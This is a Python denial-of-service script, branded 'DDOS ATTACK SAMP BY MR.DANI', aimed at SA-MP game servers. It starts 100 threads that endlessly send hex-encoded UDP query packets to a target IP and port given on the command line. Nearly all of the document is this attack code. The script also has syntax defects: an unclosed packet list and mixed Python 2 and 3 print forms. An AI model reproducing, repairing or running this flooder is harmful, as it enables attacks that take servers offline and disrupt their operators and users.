import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip
Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec'),

os.system("clear")
print ("\033[31mDdos Attacking by MR.DANI")
print ("\033[31m███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print ("\033[31m████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print ("\033[31m██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print ("\033[31m██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print ("\033[31m██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print ("\033[31m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print ("\033[31mDDOS ATTACK SAMP BY MR.DANI")
print ("\033[31mATTACK BY MR.DANI KE IP %s DAN PORT %s ") % (orgip, port) 
print ("\033[31mMENGHUBUNG ERROR/DOWN TIMEOUT....")
class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0, 3)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))


if __name__ == '__main__':
    try:
        for x in range(100):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print '************************'
        print '** DDOS TOOLS MR.DANI **'
        print '************************'
        print '\n\n'
        print ('BERHENTI MENGIRIM PAKET {}').format(orgip)
